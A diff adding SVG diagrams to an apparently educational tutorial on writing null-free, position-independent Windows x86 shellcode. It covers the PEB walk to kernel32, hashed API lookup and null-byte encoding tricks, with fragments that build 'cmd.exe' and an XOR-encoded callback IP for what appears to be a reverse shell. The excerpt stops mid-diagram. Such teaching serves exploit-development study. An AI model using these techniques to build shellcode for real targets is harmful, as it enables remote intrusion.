@@ -59,6 +59,35 @@ What makes shellcode different from a normal compiled program?
 - **No null bytes** (usually). Shellcode is often delivered through string-handling functions like `strcpy()` that stop at `0x00`. A single null byte truncates our payload. We must encode around them.
 - **No hardcoded addresses.** DLLs load at different addresses thanks to ASLR. Shellcode must locate every API function it needs at runtime.
 
+<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="300" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="30" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Normal EXE vs Shellcode</text>
+  <!-- Normal EXE side -->
+  <rect x="30" y="50" width="330" height="230" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="195" y="75" text-anchor="middle" fill="#89b4fa" font-size="14" font-weight="bold">Normal .exe</text>
+  <rect x="50" y="90" width="290" height="32" rx="4" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1"/>
+  <text x="195" y="111" text-anchor="middle" fill="#a6e3a1" font-size="11">PE Loader resolves all imports</text>
+  <rect x="50" y="130" width="290" height="32" rx="4" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1"/>
+  <text x="195" y="151" text-anchor="middle" fill="#a6e3a1" font-size="11">Fixed base address (rebased by ASLR)</text>
+  <rect x="50" y="170" width="290" height="32" rx="4" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1"/>
+  <text x="195" y="191" text-anchor="middle" fill="#a6e3a1" font-size="11">IAT provides function pointers</text>
+  <rect x="50" y="210" width="290" height="32" rx="4" fill="#1e1e2e" stroke="#a6e3a1" stroke-width="1"/>
+  <text x="195" y="231" text-anchor="middle" fill="#a6e3a1" font-size="11">Sections: .text, .data, .rdata mapped</text>
+  <text x="195" y="265" text-anchor="middle" fill="#6c7086" font-size="11">Everything set up before main() runs</text>
+  <!-- Shellcode side -->
+  <rect x="390" y="50" width="330" height="230" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="555" y="75" text-anchor="middle" fill="#f38ba8" font-size="14" font-weight="bold">Shellcode</text>
+  <rect x="410" y="90" width="290" height="32" rx="4" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1"/>
+  <text x="555" y="111" text-anchor="middle" fill="#f38ba8" font-size="11">Must find every API at runtime</text>
+  <rect x="410" y="130" width="290" height="32" rx="4" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1"/>
+  <text x="555" y="151" text-anchor="middle" fill="#f38ba8" font-size="11">Lands at unknown address (PIC)</text>
+  <rect x="410" y="170" width="290" height="32" rx="4" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1"/>
+  <text x="555" y="191" text-anchor="middle" fill="#f38ba8" font-size="11">Walks PEB + parses PE exports</text>
+  <rect x="410" y="210" width="290" height="32" rx="4" fill="#1e1e2e" stroke="#f38ba8" stroke-width="1"/>
+  <text x="555" y="231" text-anchor="middle" fill="#f38ba8" font-size="11">No sections -- raw bytes in memory</text>
+  <text x="555" y="265" text-anchor="middle" fill="#6c7086" font-size="11">Must bootstrap everything itself</text>
+</svg></div>
+
 This last point is critical. Our shellcode must be **position-independent code (PIC)** -- it works regardless of where in memory it lands. Every address we need, we compute on the fly.
 
 ### x86 Primer: The Registers We Care About
@@ -77,6 +106,46 @@ Before we dive into assembly, let's establish the registers we will use constant
 | **EDI** | Destination index | Destination pointers, PE table pointers |
 | **EBP** | Base/frame pointer | **Our variable table** (key design choice) |
 | **ESP** | Stack pointer | Top of stack (grows downward) |
+
+<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="320" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">x86 Register Map for Shellcode</text>
+  <!-- Data registers -->
+  <text x="60" y="55" fill="#89b4fa" font-size="12" font-weight="bold">Data Registers</text>
+  <rect x="30" y="65" width="160" height="38" rx="5" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+  <text x="40" y="82" fill="#a6e3a1" font-size="12" font-weight="bold">EAX</text>
+  <text x="100" y="95" fill="#cdd6f4" font-size="10">return values</text>
+  <rect x="200" y="65" width="160" height="38" rx="5" fill="#313244" stroke="#fab387" stroke-width="2"/>
+  <text x="210" y="82" fill="#fab387" font-size="12" font-weight="bold">EBX</text>
+  <text x="270" y="95" fill="#cdd6f4" font-size="10">DLL base addr</text>
+  <rect x="370" y="65" width="160" height="38" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="380" y="82" fill="#89b4fa" font-size="12" font-weight="bold">ECX</text>
+  <text x="440" y="95" fill="#cdd6f4" font-size="10">loop counter</text>
+  <rect x="540" y="65" width="180" height="38" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="550" y="82" fill="#89b4fa" font-size="12" font-weight="bold">EDX</text>
+  <text x="620" y="95" fill="#cdd6f4" font-size="10">hash accumulator</text>
+  <!-- Index registers -->
+  <text x="60" y="130" fill="#89b4fa" font-size="12" font-weight="bold">Index Registers</text>
+  <rect x="30" y="140" width="220" height="38" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="40" y="157" fill="#89b4fa" font-size="12" font-weight="bold">ESI</text>
+  <text x="120" y="170" fill="#cdd6f4" font-size="10">source ptr / PEB walk</text>
+  <rect x="270" y="140" width="220" height="38" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="280" y="157" fill="#89b4fa" font-size="12" font-weight="bold">EDI</text>
+  <text x="360" y="170" fill="#cdd6f4" font-size="10">dest ptr / PE tables</text>
+  <!-- Special registers -->
+  <text x="60" y="205" fill="#f38ba8" font-size="12" font-weight="bold">Critical Registers</text>
+  <rect x="30" y="215" width="330" height="50" rx="5" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
+  <text x="40" y="235" fill="#f38ba8" font-size="13" font-weight="bold">EBP</text>
+  <text x="90" y="235" fill="#cdd6f4" font-size="12">= our VARIABLE TABLE</text>
+  <text x="90" y="255" fill="#6c7086" font-size="10">[ebp+N] stores resolved API addresses</text>
+  <rect x="390" y="215" width="330" height="50" rx="5" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
+  <text x="400" y="235" fill="#f38ba8" font-size="13" font-weight="bold">ESP</text>
+  <text x="450" y="235" fill="#cdd6f4" font-size="12">= stack pointer (grows DOWN)</text>
+  <text x="450" y="255" fill="#6c7086" font-size="10">push decrements, pop increments</text>
+  <!-- stdcall box -->
+  <rect x="30" y="278" width="690" height="30" rx="4" fill="#313244" stroke="#fab387" stroke-width="1"/>
+  <text x="375" y="298" text-anchor="middle" fill="#fab387" font-size="11">stdcall: push args right-to-left, callee cleans stack, return value in EAX</text>
+</svg></div>
 
 > **Key concept:** The x86 stack grows *downward* in memory. `push eax` decrements ESP by 4, then writes EAX at the new ESP. `pop eax` reads from ESP, then increments by 4.
 
@@ -131,6 +200,45 @@ Instead, we use **two's complement arithmetic**. The two's complement of `0x610`
 ```
 0x00000610  -->  NOT  -->  0xFFFFF9EF  -->  +1  -->  0xFFFFF9F0
 ```
+
+<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <defs>
+    <marker id="tc-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#a6e3a1"/></marker>
+  </defs>
+  <rect width="750" height="220" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Two's Complement: Turning SUB into ADD</text>
+  <!-- Step 1: original value -->
+  <rect x="30" y="55" width="150" height="55" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="105" y="75" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">0x00000610</text>
+  <text x="105" y="98" text-anchor="middle" fill="#6c7086" font-size="10">has null bytes!</text>
+  <!-- Arrow 1 -->
+  <line x1="180" y1="82" x2="220" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#tc-arr)"/>
+  <text x="200" y="72" text-anchor="middle" fill="#a6e3a1" font-size="10">NOT</text>
+  <!-- Step 2: NOT -->
+  <rect x="225" y="55" width="150" height="55" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
+  <text x="300" y="75" text-anchor="middle" fill="#fab387" font-size="12" font-weight="bold">0xFFFFF9EF</text>
+  <text x="300" y="98" text-anchor="middle" fill="#6c7086" font-size="10">bitwise invert</text>
+  <!-- Arrow 2 -->
+  <line x1="375" y1="82" x2="415" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#tc-arr)"/>
+  <text x="395" y="72" text-anchor="middle" fill="#a6e3a1" font-size="10">+1</text>
+  <!-- Step 3: +1 -->
+  <rect x="420" y="55" width="150" height="55" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2.5"/>
+  <text x="495" y="75" text-anchor="middle" fill="#a6e3a1" font-size="12" font-weight="bold">0xFFFFF9F0</text>
+  <text x="495" y="98" text-anchor="middle" fill="#a6e3a1" font-size="10">no null bytes!</text>
+  <!-- Arrow 3 -->
+  <line x1="570" y1="82" x2="610" y2="82" stroke="#a6e3a1" stroke-width="2" marker-end="url(#tc-arr)"/>
+  <text x="590" y="72" text-anchor="middle" fill="#a6e3a1" font-size="10">USE</text>
+  <!-- Result -->
+  <rect x="615" y="50" width="110" height="65" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="670" y="72" text-anchor="middle" fill="#89b4fa" font-size="10" font-weight="bold">add esp,</text>
+  <text x="670" y="90" text-anchor="middle" fill="#89b4fa" font-size="10" font-weight="bold">0xFFFFF9F0</text>
+  <text x="670" y="108" text-anchor="middle" fill="#cdd6f4" font-size="9">= esp - 0x610</text>
+  <!-- Bottom explanation -->
+  <rect x="80" y="135" width="590" height="65" rx="6" fill="#313244" stroke="#6c7086" stroke-width="1" stroke-dasharray="4,4"/>
+  <text x="375" y="158" text-anchor="middle" fill="#cdd6f4" font-size="12">In 32-bit arithmetic: 0xFFFFF9F0 = -0x610</text>
+  <text x="375" y="178" text-anchor="middle" fill="#a6e3a1" font-size="12">ESP + (-0x610) = ESP - 0x610</text>
+  <text x="375" y="193" text-anchor="middle" fill="#6c7086" font-size="10">The CPU does not distinguish signed from unsigned -- it just adds bits</text>
+</svg></div>
 
 So `0xFFFFF9F0` is the two's complement representation of `-0x610`. Adding a negative number is the same as subtracting the positive:
 
@@ -202,6 +310,44 @@ Windows gives us a way in: the **Process Environment Block (PEB)**. Every runnin
 
 Here is the chain we follow:
 
+<div align="center"><svg viewBox="0 0 750 160" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <defs>
+    <marker id="peb-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#a6e3a1"/></marker>
+  </defs>
+  <rect width="750" height="160" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">The PEB Walk: 4 Steps to kernel32.dll</text>
+  <!-- Step 1 -->
+  <rect x="20" y="55" width="140" height="80" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="90" y="73" text-anchor="middle" fill="#a6e3a1" font-size="18" font-weight="bold">1</text>
+  <text x="90" y="93" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">FS:[0x30]</text>
+  <text x="90" y="110" text-anchor="middle" fill="#cdd6f4" font-size="10">TEB has PEB ptr</text>
+  <text x="90" y="127" text-anchor="middle" fill="#6c7086" font-size="9">xor ecx,ecx</text>
+  <!-- Arrow -->
+  <line x1="160" y1="90" x2="190" y2="90" stroke="#a6e3a1" stroke-width="2" marker-end="url(#peb-arr)"/>
+  <!-- Step 2 -->
+  <rect x="195" y="55" width="140" height="80" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="265" y="73" text-anchor="middle" fill="#a6e3a1" font-size="18" font-weight="bold">2</text>
+  <text x="265" y="93" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">PEB+0x0C</text>
+  <text x="265" y="110" text-anchor="middle" fill="#cdd6f4" font-size="10">PEB_LDR_DATA</text>
+  <text x="265" y="127" text-anchor="middle" fill="#6c7086" font-size="9">loader tables</text>
+  <!-- Arrow -->
+  <line x1="335" y1="90" x2="365" y2="90" stroke="#a6e3a1" stroke-width="2" marker-end="url(#peb-arr)"/>
+  <!-- Step 3 -->
+  <rect x="370" y="55" width="160" height="80" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="450" y="73" text-anchor="middle" fill="#a6e3a1" font-size="18" font-weight="bold">3</text>
+  <text x="450" y="93" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">LDR+0x1C</text>
+  <text x="450" y="110" text-anchor="middle" fill="#cdd6f4" font-size="10">InInitOrder list</text>
+  <text x="450" y="127" text-anchor="middle" fill="#6c7086" font-size="9">linked list of DLLs</text>
+  <!-- Arrow -->
+  <line x1="530" y1="90" x2="560" y2="90" stroke="#a6e3a1" stroke-width="2" marker-end="url(#peb-arr)"/>
+  <!-- Step 4 -->
+  <rect x="565" y="55" width="160" height="80" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
+  <text x="645" y="73" text-anchor="middle" fill="#a6e3a1" font-size="18" font-weight="bold">4</text>
+  <text x="645" y="93" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">Entry+0x08</text>
+  <text x="645" y="110" text-anchor="middle" fill="#f38ba8" font-size="10">Base Address!</text>
+  <text x="645" y="127" text-anchor="middle" fill="#a6e3a1" font-size="9">EBX = kernel32 base</text>
+</svg></div>
+
 1. **Thread Environment Block (TEB):** On x86 Windows, the `FS` segment register always points to the TEB of the current thread. At offset `0x30` within the TEB sits a pointer to the PEB.
 
 2. **PEB (Process Environment Block):** At offset `0x0C` within the PEB sits a pointer to `PEB_LDR_DATA` -- the loader data structure.
@@ -249,6 +395,80 @@ Let's walk through every instruction.
 **`mov esi, [esi]`** -- We advance ESI to the next entry in the linked list (the Flink pointer is at offset `0x00`). We do this *before* the comparison because if this module is not kernel32.dll, we need ESI already pointing to the next entry.
 
 **`cmp [edi+12*2], cx`** -- Here is the identification trick. The string `kernel32.dll` has exactly 12 characters. In Unicode (UTF-16LE), each character is 2 bytes, so the 13th character (index 12) is at byte offset `12 * 2 = 24`. For `kernel32.dll`, that 13th character is the null terminator (`0x0000`). CX is still zero from our earlier `xor ecx, ecx`, so this comparison checks: "Does this module name have exactly 12 characters?" That uniquely identifies `kernel32.dll` among the typically loaded modules.
+
+<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="200" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Unicode String Layout: "kernel32.dll"</text>
+  <text x="40" y="55" fill="#6c7086" font-size="10">Byte offset:</text>
+  <!-- Byte offset numbers -->
+  <text x="105" y="55" fill="#6c7086" font-size="9" text-anchor="middle">0</text>
+  <text x="131" y="55" fill="#6c7086" font-size="9" text-anchor="middle">2</text>
+  <text x="157" y="55" fill="#6c7086" font-size="9" text-anchor="middle">4</text>
+  <text x="183" y="55" fill="#6c7086" font-size="9" text-anchor="middle">6</text>
+  <text x="209" y="55" fill="#6c7086" font-size="9" text-anchor="middle">8</text>
+  <text x="235" y="55" fill="#6c7086" font-size="9" text-anchor="middle">10</text>
+  <text x="261" y="55" fill="#6c7086" font-size="9" text-anchor="middle">12</text>
+  <text x="287" y="55" fill="#6c7086" font-size="9" text-anchor="middle">14</text>
+  <text x="313" y="55" fill="#6c7086" font-size="9" text-anchor="middle">16</text>
+  <text x="339" y="55" fill="#6c7086" font-size="9" text-anchor="middle">18</text>
+  <text x="365" y="55" fill="#6c7086" font-size="9" text-anchor="middle">20</text>
+  <text x="391" y="55" fill="#6c7086" font-size="9" text-anchor="middle">22</text>
+  <text x="417" y="55" fill="#f38ba8" font-size="9" text-anchor="middle" font-weight="bold">24</text>
+  <!-- Character cells -->
+  <rect x="92" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="105" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">k</text>
+  <rect x="118" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="131" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">e</text>
+  <rect x="144" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="157" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">r</text>
+  <rect x="170" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="183" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">n</text>
+  <rect x="196" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="209" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">e</text>
+  <rect x="222" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="235" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">l</text>
+  <rect x="248" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="261" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">3</text>
+  <rect x="274" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="287" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">2</text>
+  <rect x="300" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="313" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">.</text>
+  <rect x="326" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="339" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">d</text>
+  <rect x="352" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="365" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">l</text>
+  <rect x="378" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="391" y="82" text-anchor="middle" fill="#cdd6f4" font-size="11">l</text>
+  <rect x="404" y="62" width="26" height="30" rx="3" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
+  <text x="417" y="82" text-anchor="middle" fill="#f38ba8" font-size="11" font-weight="bold">\0</text>
+  <!-- Index labels -->
+  <text x="40" y="82" fill="#6c7086" font-size="10">Char index:</text>
+  <text x="105" y="108" fill="#6c7086" font-size="8" text-anchor="middle">0</text>
+  <text x="131" y="108" fill="#6c7086" font-size="8" text-anchor="middle">1</text>
+  <text x="157" y="108" fill="#6c7086" font-size="8" text-anchor="middle">2</text>
+  <text x="183" y="108" fill="#6c7086" font-size="8" text-anchor="middle">3</text>
+  <text x="209" y="108" fill="#6c7086" font-size="8" text-anchor="middle">4</text>
+  <text x="235" y="108" fill="#6c7086" font-size="8" text-anchor="middle">5</text>
+  <text x="261" y="108" fill="#6c7086" font-size="8" text-anchor="middle">6</text>
+  <text x="287" y="108" fill="#6c7086" font-size="8" text-anchor="middle">7</text>
+  <text x="313" y="108" fill="#6c7086" font-size="8" text-anchor="middle">8</text>
+  <text x="339" y="108" fill="#6c7086" font-size="8" text-anchor="middle">9</text>
+  <text x="365" y="108" fill="#6c7086" font-size="8" text-anchor="middle">10</text>
+  <text x="391" y="108" fill="#6c7086" font-size="8" text-anchor="middle">11</text>
+  <text x="417" y="108" fill="#f38ba8" font-size="8" text-anchor="middle" font-weight="bold">12</text>
+  <!-- Annotation -->
+  <rect x="440" y="62" width="290" height="50" rx="5" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="585" y="82" text-anchor="middle" fill="#f38ba8" font-size="11" font-weight="bold">cmp [edi + 12*2], cx</text>
+  <text x="585" y="100" text-anchor="middle" fill="#cdd6f4" font-size="10">byte 24 = char index 12 = \0</text>
+  <!-- Bottom comparison -->
+  <rect x="92" y="125" width="640" height="55" rx="5" fill="#313244" stroke="#6c7086" stroke-width="1" stroke-dasharray="4,4"/>
+  <text x="130" y="148" fill="#fab387" font-size="11">"ntdll.dll"</text>
+  <text x="270" y="148" fill="#6c7086" font-size="10">= 9 chars, index 12 is past the string</text>
+  <text x="490" y="148" fill="#f38ba8" font-size="11">NOT zero at [12*2]</text>
+  <text x="130" y="168" fill="#fab387" font-size="11">"kernelbase.dll"</text>
+  <text x="290" y="168" fill="#6c7086" font-size="10">= 14 chars, index 12 = 'l'</text>
+  <text x="490" y="168" fill="#f38ba8" font-size="11">NOT zero at [12*2]</text>
+</svg></div>
 
 **`jne next_module`** -- If the comparison fails, this is not our module. Loop to the next one.
 
@@ -461,6 +681,46 @@ find_function_finished:
 
 **The `[esp+0x24]` magic:** The caller does `push hash; call [ebp+0x04]`. The `call` pushes a 4-byte return address. Then `pushad` saves 8 registers (32 = `0x20` bytes). So the hash is at `ESP + 0x20 + 0x04 = ESP + 0x24`.
 
+<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="340" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">The pushad Frame: Why [esp+0x24] Reaches the Hash</text>
+  <!-- Stack visualization -->
+  <text x="60" y="55" fill="#6c7086" font-size="10">HIGH ADDR</text>
+  <!-- Hash argument -->
+  <rect x="200" y="60" width="280" height="32" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
+  <text x="340" y="81" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">Hash argument (0xec0e4e8e)</text>
+  <text x="530" y="81" fill="#f38ba8" font-size="11">ESP+0x24</text>
+  <!-- Return address -->
+  <rect x="200" y="95" width="280" height="32" rx="4" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
+  <text x="340" y="116" text-anchor="middle" fill="#fab387" font-size="12">Return address (from CALL)</text>
+  <text x="530" y="116" fill="#6c7086" font-size="10">+0x04</text>
+  <!-- pushad frame -->
+  <rect x="200" y="132" width="280" height="28" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="340" y="151" text-anchor="middle" fill="#cdd6f4" font-size="11">saved EDI</text>
+  <text x="530" y="151" fill="#6c7086" font-size="10">+0x20</text>
+  <rect x="200" y="162" width="280" height="28" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="340" y="181" text-anchor="middle" fill="#cdd6f4" font-size="11">saved ESI</text>
+  <rect x="200" y="192" width="280" height="28" rx="3" fill="#313244" stroke="#89b4fa" stroke-width="1"/>
+  <text x="340" y="211" text-anchor="middle" fill="#cdd6f4" font-size="11">saved EBP, ESP, EBX, EDX, ECX</text>
+  <rect x="200" y="222" width="280" height="28" rx="3" fill="#313244" stroke="#a6e3a1" stroke-width="2.5"/>
+  <text x="340" y="241" text-anchor="middle" fill="#a6e3a1" font-size="11" font-weight="bold">saved EAX  [esp+0x1C] overwrite!</text>
+  <text x="530" y="241" fill="#a6e3a1" font-size="10">+0x00</text>
+  <!-- ESP pointer -->
+  <rect x="200" y="255" width="280" height="28" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="340" y="274" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">ESP (after pushad)</text>
+  <!-- Annotations -->
+  <text x="60" y="285" fill="#6c7086" font-size="10">LOW ADDR</text>
+  <!-- Brace for pushad -->
+  <line x1="175" y1="135" x2="175" y2="250" stroke="#89b4fa" stroke-width="2"/>
+  <line x1="175" y1="135" x2="185" y2="135" stroke="#89b4fa" stroke-width="2"/>
+  <line x1="175" y1="250" x2="185" y2="250" stroke="#89b4fa" stroke-width="2"/>
+  <text x="100" y="195" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">pushad</text>
+  <text x="100" y="210" text-anchor="middle" fill="#89b4fa" font-size="10">0x20 bytes</text>
+  <!-- Result box -->
+  <rect x="140" y="295" width="470" height="30" rx="5" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="375" y="315" text-anchor="middle" fill="#a6e3a1" font-size="11">After popad: EAX = resolved function address (written at [esp+0x1C])</text>
+</svg></div>
+
 **The pushad frame trick:** Writing to `[esp+0x1c]` overwrites the saved EAX in the pushad frame. When `popad` restores all registers, EAX magically contains our resolved function address.
 
 ### Using find_function
@@ -593,6 +853,43 @@ xor   eax, 0x50505050       ; Key
 ; Result: 0x0501A8C0 = 192.168.1.5 in little-endian
 ```
 
+<div align="center"><svg viewBox="0 0 750 400" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="400" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Null-Free Encoding Cheat Sheet</text>
+  <!-- Row 1 -->
+  <rect x="20" y="48" width="225" height="48" rx="5" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="30" y="66" fill="#a6e3a1" font-size="11" font-weight="bold">1. XOR Zero</text>
+  <text x="30" y="86" fill="#cdd6f4" font-size="10">mov eax,0 --> xor eax,eax</text>
+  <rect x="260" y="48" width="225" height="48" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="270" y="66" fill="#89b4fa" font-size="11" font-weight="bold">2. Two's Complement</text>
+  <text x="270" y="86" fill="#cdd6f4" font-size="10">sub 0x610 --> add 0xFFFFF9F0</text>
+  <rect x="500" y="48" width="230" height="48" rx="5" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="510" y="66" fill="#f38ba8" font-size="11" font-weight="bold">3. NOT Encoding</text>
+  <text x="510" y="86" fill="#cdd6f4" font-size="10">push NOT(val); pop; not</text>
+  <!-- Row 2 -->
+  <rect x="20" y="108" width="225" height="48" rx="5" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
+  <text x="30" y="126" fill="#fab387" font-size="11" font-weight="bold">4. NEG Byte</text>
+  <text x="30" y="146" fill="#cdd6f4" font-size="10">mov al,0xFA; neg al = 0x06</text>
+  <rect x="260" y="108" width="225" height="48" rx="5" fill="#313244" stroke="#a6e3a1" stroke-width="1.5"/>
+  <text x="270" y="126" fill="#a6e3a1" font-size="11" font-weight="bold">5. INC/DEC Chain</text>
+  <text x="270" y="146" fill="#cdd6f4" font-size="10">xor eax,eax; inc; inc = 2</text>
+  <rect x="500" y="108" width="230" height="48" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="510" y="126" fill="#89b4fa" font-size="11" font-weight="bold">6. SHL Build</text>
+  <text x="510" y="146" fill="#cdd6f4" font-size="10">mov al,X; shl; mov al,Y</text>
+  <!-- Row 3 centered -->
+  <rect x="260" y="168" width="225" height="48" rx="5" fill="#313244" stroke="#f38ba8" stroke-width="1.5"/>
+  <text x="270" y="186" fill="#f38ba8" font-size="11" font-weight="bold">7. XOR Key</text>
+  <text x="270" y="206" fill="#cdd6f4" font-size="10">mov eax,encoded; xor eax,key</text>
+  <!-- Concrete example -->
+  <rect x="40" y="238" width="670" height="140" rx="6" fill="#313244" stroke="#fab387" stroke-width="1.5"/>
+  <text x="375" y="260" text-anchor="middle" fill="#fab387" font-size="13" font-weight="bold">Example: Building 0x00000100 (STARTF_USESTDHANDLES)</text>
+  <text x="60" y="285" fill="#6c7086" font-size="11">Need: 0x00000100</text>
+  <text x="280" y="285" fill="#f38ba8" font-size="11">Problem: three null bytes</text>
+  <text x="60" y="310" fill="#a6e3a1" font-size="11">Solution (NOT): push 0xFFFFFEFF; pop eax; not eax</text>
+  <text x="60" y="335" fill="#89b4fa" font-size="11">Solution (SHL): xor eax,eax; inc eax; shl eax, 8</text>
+  <text x="60" y="360" fill="#cdd6f4" font-size="11">Both produce 0x00000100 with zero null bytes in the assembled opcodes</text>
+</svg></div>
+
 > These patterns are composable. A single value might require a shift, a NOT, and an INC. The more patterns you internalize, the faster you can adapt to any bad character set.
 
 ---
@@ -616,6 +913,69 @@ Group into DWORDs:
 DWORD 1: "cmd." = 0x2e646d63
 DWORD 2: "exe\0" = 0x00657865  (contains null!)
 ```
+
+<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <defs>
+    <marker id="str-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#a6e3a1"/></marker>
+  </defs>
+  <rect width="750" height="320" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Building "cmd.exe" on the Stack</text>
+  <!-- Step 1 -->
+  <text x="40" y="58" fill="#a6e3a1" font-size="12" font-weight="bold">Step 1:</text>
+  <text x="110" y="58" fill="#cdd6f4" font-size="12">xor eax, eax</text>
+  <text x="350" y="58" fill="#6c7086" font-size="10">EAX = 0x00000000</text>
+  <!-- Step 2 -->
